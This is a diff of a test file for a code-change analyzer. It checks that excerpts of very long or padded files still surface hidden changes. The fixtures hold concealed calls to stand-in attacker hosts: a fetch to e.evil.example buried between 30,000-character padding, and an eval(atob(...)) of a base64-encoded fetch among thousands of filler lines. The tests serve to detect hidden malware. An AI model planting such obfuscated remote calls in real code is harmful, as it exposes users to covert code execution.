@@ -114,6 +114,20 @@ describe('analyze', () => {
     expect(analysis.omitted).toMatch(/hunks are left out/);
   });
 
+  it('shows the changed part of a very long line', async () => {
+    const config = (flag: string) =>
+      `init(${JSON.stringify({ a: 'x'.repeat(30_000), flag, b: 'y'.repeat(30_000) })});`;
+    const analysis = await analyze(
+      Buffer.from(config('fetch("https://e.evil.example")')),
+      Buffer.from(config('off')),
+      8_000,
+    );
+    expect(analysis.excerpt.length).toBeLessThan(8_000);
+    expect(analysis.excerpt).toMatch(/^-.*off/m);
+    expect(analysis.excerpt).toMatch(/^\+.*e\.evil\.example/m);
+    expect(analysis.excerpt).toContain('characters... */');
+  });
+
   it('shows the risky parts of a large new script', async () => {
     const big = `${'var pad = "x";\n'.repeat(20_000)}eval(atob("ZmV0Y2goJ2h0dHBzOi8vZXZpbC5leGFtcGxlJyk="));\n${'var tail = 1;\n'.repeat(5000)}`;
     const analysis = await analyze(Buffer.from(big), undefined, 20_000);
